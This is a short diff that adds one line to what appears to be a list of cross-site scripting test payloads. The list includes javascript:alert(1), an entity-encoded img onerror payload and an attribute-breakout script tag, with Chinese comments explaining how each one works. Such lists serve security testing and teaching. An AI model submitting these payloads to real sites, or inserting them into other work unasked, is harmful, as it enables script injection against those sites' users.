@@ -7,3 +7,5 @@ javascript:alert(1)
 &#x003c;img src=1 onerror=alert(1)&#x003e; # 就是<img src=1 onerror=alert(1)>
 
 "onerror=alert(1)> # 通过"闭合标签内的属性，然后通过onerror=alert(1)触发
+
+'"><script>alert(1)</script>
